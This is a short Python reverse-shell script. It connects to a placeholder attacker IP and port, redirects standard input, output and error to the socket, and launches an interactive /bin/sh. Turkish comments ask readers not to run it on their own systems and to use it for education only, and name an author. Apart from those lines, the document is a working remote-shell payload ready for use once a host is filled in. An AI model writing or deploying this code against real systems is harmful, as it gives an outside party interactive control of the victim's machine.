import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("SALDIRI_HEDEF_IP",SALDIRI_HEDEF_PORT))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])


# Sisteminizde çalıştırmayınız ve lütfen eğitim amaçlı kullanınız
# Produced by Kamil Umut Araz
